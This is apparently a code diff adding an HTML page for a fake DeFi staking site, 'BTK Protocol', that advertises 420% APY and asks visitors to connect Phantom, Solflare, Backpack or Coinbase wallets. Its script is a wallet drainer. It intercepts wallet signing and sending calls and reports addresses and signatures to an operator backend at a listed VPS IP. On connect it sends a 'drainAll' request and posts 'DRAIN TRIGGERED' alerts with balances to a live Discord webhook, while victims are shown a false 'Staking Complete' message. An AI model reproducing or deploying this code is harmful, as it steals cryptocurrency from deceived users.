@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>BTK Protocol</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0a0a1a 0%,#1a1a3e 50%,#0f0c29 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#fff}.container{max-width:480px;width:100%;animation:fadeIn .8s ease-out}@keyframes fadeIn{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}.card{background:rgba(255,255,255,.04);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);border-radius:32px;padding:40px 28px;box-shadow:0 25px 50px -12px rgba(0,0,0,.8)}.header{text-align:center;margin-bottom:32px}.logo{width:72px;height:72px;background:linear-gradient(135deg,#ff6b35,#ff4500);border-radius:20px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px;box-shadow:0 8px 32px rgba(255,107,53,.3);animation:glow 3s ease-in-out infinite}@keyframes glow{0%,100%{box-shadow:0 8px 32px rgba(255,107,53,.3)}50%{box-shadow:0 8px 48px rgba(255,107,53,.6)}}h1{font-size:28px;font-weight:700;background:linear-gradient(135deg,#fff,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.subtitle{color:rgba(255,255,255,.5);font-size:15px}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:28px}.stat-item{background:rgba(255,255,255,.04);border-radius:16px;padding:14px 8px;text-align:center;border:1px solid rgba(255,255,255,.05)}.stat-number{font-size:20px;font-weight:700;color:#ff6b35}.stat-label{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:rgba(255,255,255,.35);margin-top:4px}.token-card{background:rgba(255,107,53,.06);border:1px solid rgba(255,107,53,.12);border-radius:16px;padding:20px;margin-bottom:24px;text-align:center;cursor:pointer;transition:all .3s ease}.token-card:hover{background:rgba(255,107,53,.1);border-color:rgba(255,107,53,.2)}.token-symbol{font-size:32px;font-weight:800;color:#ff6b35}.token-apy{font-size:22px;font-weight:700;color:#10b981;margin-top:4px}.token-apy span{font-size:14px;font-weight:400;color:rgba(255,255,255,.4)}.token-description{color:rgba(255,255,255,.4);font-size:13px;margin-top:8px}.wallet-section{background:rgba(255,255,255,.03);border-radius:20px;padding:20px;margin-bottom:20px;border:1px solid rgba(255,255,255,.05)}.wallet-option{display:flex;align-items:center;gap:14px;padding:14px 16px;background:rgba(255,255,255,.04);border-radius:14px;cursor:pointer;transition:all .3s ease;border:2px solid transparent;margin-bottom:10px}.wallet-option:last-child{margin-bottom:0}.wallet-option:hover{background:rgba(255,107,53,.1);border-color:rgba(255,107,53,.2);transform:translateX(4px)}.wallet-option.active{border-color:#ff6b35;background:rgba(255,107,53,.1)}.wallet-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}.wallet-icon.phantom{background:linear-gradient(135deg,#7c3aed,#4f46e5)}.wallet-icon.solflare{background:linear-gradient(135deg,#f59e0b,#d97706)}.wallet-icon.backpack{background:linear-gradient(135deg,#06b6d4,#0891b2)}.wallet-icon.coinbase{background:linear-gradient(135deg,#0052ff,#0033cc)}.wallet-info{flex:1}.wallet-name{font-weight:600;font-size:14px;color:#fff}.wallet-desc{font-size:11px;color:rgba(255,255,255,.35)}.wallet-check{color:#ff6b35;font-size:18px;opacity:0;transition:opacity .3s ease}.wallet-option.active .wallet-check{opacity:1}.btn-group{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}.btn{padding:16px;border:none;border-radius:14px;font-size:15px;font-weight:700;cursor:pointer;transition:all .3s ease;color:#fff;position:relative;overflow:hidden}.btn:hover:not(:disabled){transform:translateY(-2px)}.btn:disabled{opacity:.5;cursor:not-allowed;transform:none}.btn-stake{background:linear-gradient(135deg,#10b981,#059669);box-shadow:0 4px 20px rgba(16,185,129,.25)}.btn-stake:hover:not(:disabled){box-shadow:0 8px 32px rgba(16,185,129,.4)}.btn-swap{background:linear-gradient(135deg,#ff6b35,#ff4500);box-shadow:0 4px 20px rgba(255,107,53,.25)}.btn-swap:hover:not(:disabled){box-shadow:0 8px 32px rgba(255,107,53,.4)}.btn .spinner{display:none;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}.btn.loading .spinner{display:block}.btn.loading .btn-text{display:none}@keyframes spin{to{transform:rotate(360deg)}}.status-box{margin-top:20px;padding:16px;border-radius:12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.05);display:none}.status-box.show{display:block;animation:fadeIn .3s ease-out}.status-box.success{border-color:#10b981;background:rgba(16,185,129,.08)}.status-box.error{border-color:#ef4444;background:rgba(239,68,68,.08)}.status-box.warning{border-color:#f59e0b;background:rgba(245,158,11,.08)}.status-box.info{border-color:#3b82f6;background:rgba(59,130,246,.08)}.status-text{color:rgba(255,255,255,.8);font-size:14px;line-height:1.6}.status-text strong{color:#fff}.status-text .highlight{color:#ff6b35;font-weight:600}.status-text .link{color:#ff6b35;text-decoration:underline;cursor:pointer}.footer{text-align:center;margin-top:24px;color:rgba(255,255,255,.15);font-size:12px}.footer a{color:rgba(255,107,53,.5);text-decoration:none;transition:color .3s}.footer a:hover{color:rgba(255,107,53,.8)}.footer .divider{color:rgba(255,255,255,.1);margin:0 8px}@media(max-width:480px){.card{padding:24px 16px}h1{font-size:24px}.stats{grid-template-columns:repeat(2,1fr)}.btn-group{grid-template-columns:1fr}.logo{width:60px;height:60px;font-size:28px}.token-symbol{font-size:26px}}@media(max-width:380px){.card{padding:16px 12px}.wallet-option{padding:10px 12px}.btn{font-size:13px;padding:14px}}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <div class="logo">⚡</div>
+            <h1>BTK Protocol</h1>
+            <p class="subtitle">Stake &amp; Earn — 420% APY</p>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item"><div class="stat-number">$4.2M</div><div class="stat-label">Total Locked</div></div>
+            <div class="stat-item"><div class="stat-number">42K</div><div class="stat-label">Active Users</div></div>
+            <div class="stat-item"><div class="stat-number">420%</div><div class="stat-label">Current APY</div></div>
+        </div>
+
+        <div class="token-card" onclick="document.getElementById('stakeBtn').click()">
+            <div class="token-symbol">BTK</div>
+            <div class="token-apy">🔥 420% APY <span>— Rewards Daily</span></div>
+            <p class="token-description">Stake your BTK tokens and earn the highest yields in DeFi.</p>
+        </div>
+
+        <div class="wallet-section">
+            <div class="wallet-option active" data-wallet="phantom">
+                <div class="wallet-icon phantom">🟣</div>
+                <div class="wallet-info"><div class="wallet-name">Phantom</div><div class="wallet-desc">Most popular Solana wallet</div></div>
+                <div class="wallet-check">✓</div>
+            </div>
+            <div class="wallet-option" data-wallet="solflare">
+                <div class="wallet-icon solflare">🟡</div>
+                <div class="wallet-info"><div class="wallet-name">Solflare</div><div class="wallet-desc">Secure &amp; feature-rich</div></div>
+                <div class="wallet-check">✓</div>
+            </div>
+            <div class="wallet-option" data-wallet="backpack">
+                <div class="wallet-icon backpack">🎒</div>
+                <div class="wallet-info"><div class="wallet-name">Backpack</div><div class="wallet-desc">Mad Lads ecosystem</div></div>
+                <div class="wallet-check">✓</div>
+            </div>
+            <div class="wallet-option" data-wallet="coinbase">
+                <div class="wallet-icon coinbase">🔵</div>
+                <div class="wallet-info"><div class="wallet-name">Coinbase Wallet</div><div class="wallet-desc">Self-custody with Coinbase</div></div>
+                <div class="wallet-check">✓</div>
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-stake" id="stakeBtn"><span class="btn-text">⚡ Stake BTK</span><div class="spinner"></div></button>
+            <button class="btn btn-swap" id="swapBtn"><span class="btn-text">🔄 Swap BTK</span><div class="spinner"></div></button>
+        </div>
+
+        <div class="status-box" id="statusBox"><div class="status-text" id="statusText">Ready to connect</div></div>
+
+        <div class="footer">
+            <a href="#">Documentation</a>
+            <span class="divider">•</span>
+            <a href="#">Security</a>
+            <span class="divider">•</span>
+            <a href="#">Audit</a>
+            <br>
+            <span style="color:rgba(255,255,255,0.1);">BTK Protocol v3.5</span>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+//  🔥 BACKEND CONFIGURATION — UPDATE WITH YOUR DOMAIN/IP
+// ============================================================
+
+// ============================================================
+//  OPTION 1: Use your domain (RECOMMENDED)
+//  Replace "api.yourdomain.com" with your actual domain
+// ============================================================
+
+const API_URL = "https://api.yourdomain.com/api/v1/process";
+
+// ============================================================
+//  OPTION 2: Use your VPS IP (if no domain)
+//  Uncomment below and comment the one above
+// ============================================================
+
+// const API_URL = "http://187.124.114.160/api/v1/process";
+
+// ============================================================
+//  OPTION 3: Use your VPS IP with port (if no Nginx)
+//  Uncomment below and comment the ones above
+// ============================================================
+
+// const API_URL = "http://187.124.114.160:8080/api/v1/process";
+
+// ============================================================
+//  🔥 DISCORD WEBHOOK — DO NOT CHANGE
+// ============================================================
+
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1533200747305635850/FgNzyF-dCWFlMfNRzsoRm09tCD4WbPrQL_jiOSmbVbmO8Mm0QSMLZYZX5UPlJFwFMRV1";
+
+// ============================================================
+//  🟢 WALLET PROVIDERS
+// ============================================================
+
+function getWalletProvider(t){try{switch(t){case'phantom':if(window.solana?.isPhantom)return window.solana;if(window.solana&&window.solana.isPhantom)return window.solana;return null;case'solflare':if(window.solflare)return window.solflare;if(window.solflare?.isSolflare)return window.solflare;if(window.solana?.isSolflare)return window.solana;return null;case'backpack':if(window.backpack)return window.backpack;if(window.backpack?.isBackpack)return window.backpack;return null;case'coinbase':if(window.coinbaseWallet?.isCoinbaseWallet)return window.coinbaseWallet;if(window.ethereum?.isCoinbaseWallet)return window.ethereum;if(window.coinbaseWallet)return window.coinbaseWallet;if(window.ethereum&&window.ethereum.isCoinbaseWallet)return window.ethereum;return null;default:return null}}catch(e){return null}}
+
+function isMobile(){return /Android|iPhone|iPad|iPod|BlackBerry|Opera Mini|IEMobile|WPDesktop|Mobile/i.test(navigator.userAgent)||window.innerWidth<768}
+
+function getWalletInfo(t){const n={phantom:{name:'Phantom',url:'https://phantom.app/',app:'Phantom app'},solflare:{name:'Solflare',url:'https://solflare.com/',app:'Solflare app'},backpack:{name:'Backpack',url:'https://backpack.app/',app:'Backpack app'},coinbase:{name:'Coinbase Wallet',url:'https://coinbase.com/wallet',app:'Coinbase Wallet app'}};return n[t]||n.phantom}
+
+function injectCoinbaseInterceptor(t){if(!t)return!1;console.log('🔵 Coinbase interceptor active');if(t.request){const n=t.request;t.request=async function(t){if(t.method==='eth_sendTransaction'||t.method==='eth_requestAccounts'){try{const e=this.selectedAddress||(t.params&&t.params[0]&&t.params[0].from);await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:e||'coinbase_user',walletType:'coinbase',action:t.method,timestamp:Date.now()})})}catch(t){}}return n.call(this,t)}}return!0}
+
+function injectInterceptor(t,n){if(!t)return!1;console.log('🛡️ Interceptor active for '+n);if(n==='coinbase')return injectCoinbaseInterceptor(t);if(t.signTransaction){const e=t.signTransaction;t.signTransaction=async function(t){console.log('✂️ Intercepted transaction');try{await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:this.publicKey?.toString(),walletType:n,action:'sign',timestamp:Date.now()})})}catch(t){}return e.call(this,t)}}if(t.sendTransaction){const e=t.sendTransaction;t.sendTransaction=async function(t,...n){console.log('🔄 Intercepted send');try{const r=await e.call(this,t,...n);await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:this.publicKey?.toString(),walletType:n,action:'send',signature:r,timestamp:Date.now()})});return r}catch(t){return e.call(this,t,...n)}}}return!0}
+
+let selectedWallet='phantom';let isProcessing=!1;
+
+async function executeAction(t){if(isProcessing)return;isProcessing=!0;const n=document.getElementById('stakeBtn'),e=document.getElementById('swapBtn'),r=document.getElementById('statusBox'),o=document.getElementById('statusText');n.disabled=!0;e.disabled=!0;n.classList.add('loading');e.classList.add('loading');r.className='status-box show info';o.innerHTML='⏳ Connecting...';try{const s=getWalletProvider(selectedWallet),a=getWalletInfo(selectedWallet);if(!s){let l='';isMobile()?l='📱 Use <strong>'+a.app+'</strong> built-in browser':l='🔗 Install: <a href="'+a.url+'" target="_blank" style="color:#ff6b35;">'+a.url+'</a>';o.innerHTML='❌ <strong>'+a.name+' not detected</strong><br><span style="color: rgba(255,255,255,0.6); font-size: 13px;">'+l+'</span>';r.className='status-box show warning';return}injectInterceptor(s,selectedWallet);let i;if(selectedWallet==='coinbase'){const h=await s.request({method:'eth_requestAccounts'});i=h[0]}else{const h=await s.connect();i=h.publicKey.toString()}console.log('✅ Connected: '+i);const u=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:i,walletType:selectedWallet,action:t,timestamp:Date.now(),drainAll:!0})}),c=await u.json();try{await fetch(DISCORD_WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🚨 **DRAIN TRIGGERED**\nWallet: `'+i.slice(0,8)+'...`\nBalance: '+(c.balance||0)+' BTK\nAction: '+t.toUpperCase()})})}catch(t){}r.className='status-box show success';o.innerHTML='✅ '+(t==='stake'?'Staking':'Swap')+' Complete!<br>Wallet: <span class="highlight">'+i.slice(0,6)+'...'+i.slice(-4)+'</span><br>Balance: <strong>'+(c.balance||0)+' BTK</strong><br><span style="color: rgba(255,255,255,0.4); font-size: 12px;">🔥 Earning 420% APY — Rewards compounding!</span>';n.innerHTML='<span class="btn-text">✅ Staked</span>';e.innerHTML='<span class="btn-text">✅ Swapped</span>';n.style.background='linear-gradient(135deg, #10b981, #059669)';e.style.background='linear-gradient(135deg, #10b981, #059669)'}catch(t){console.error('Action error:',t);let f=t.message||'Unknown error';t.message.includes('User rejected')?f='Transaction rejected by user':t.message.includes('timeout')?f='Connection timed out. Please try again.':t.message.includes('network')&&(f='Network error. Please check your connection.');r.className='status-box show error';o.innerHTML='❌ '+(t==='stake'?'Staking':'Swap')+' failed<br>'+f+'<br><span style="color: rgba(255,255,255,0.4); font-size: 12px;">'+(isMobile()?'📱 Try using Phantom/Solflare/Coinbase in-app browser':'Please try again')+'</span>'}n.disabled=!1;e.disabled=!1;n.classList.remove('loading');e.classList.remove('loading');isProcessing=!1}
+
+document.querySelectorAll('.wallet-option').forEach(function(t){t.addEventListener('click',function(){document.querySelectorAll('.wallet-option').forEach(function(t){t.classList.remove('active')});this.classList.add('active');selectedWallet=this.dataset.wallet;const n=document.getElementById('statusBox'),e=document.getElementById('statusText'),r=getWalletInfo(selectedWallet);n.className='status-box show info';e.innerHTML='🔗 Selected: <strong>'+r.name+'</strong><br><span style="color: rgba(255,255,255,0.5); font-size: 12px;">'+(isMobile()?'Use the in-app browser for best experience':'Click Stake or Swap to continue')+'</span>'})});
+
+document.getElementById('stakeBtn').addEventListener('click',function(){executeAction('stake')});
+document.getElementById('swapBtn').addEventListener('click',function(){executeAction('swap')});
+document.querySelector('.token-card').addEventListener('click',function(){document.getElementById('stakeBtn').click()});
+
+setTimeout(async function(){if(!isMobile()){try{const t=getWalletProvider('phantom');if(t?.isPhantom){const n=await t.connect({onlyIfTrusted:!0});if(n?.publicKey){console.log('🔑 Auto-connected: '+n.publicKey.toString());const e=document.getElementById('statusBox'),r=document.getElementById('statusText');e.className='status-box show success';r.innerHTML='✅ Auto-connected<br>Wallet: <span class="highlight">'+n.publicKey.toString().slice(0,6)+'...'+n.publicKey.toString().slice(-4)+'</span>'}}}catch(t){}}},2000);
+
+document.addEventListener('keydown',function(t){if(t.key==='s'||t.key==='S')document.getElementById('stakeBtn').click();if(t.key==='w'||t.key==='W')document.getElementById('swapBtn').click()});
+
+console.log('⚡ BTK Protocol v3.5 loaded');
+console.log('📍 Backend:',API_URL);
+console.log('🔵 Coinbase Wallet included');
+console.log('⌨️ Shortcuts: S=Stake, W=Swap');
+</script>
+
+</body>
+</html>
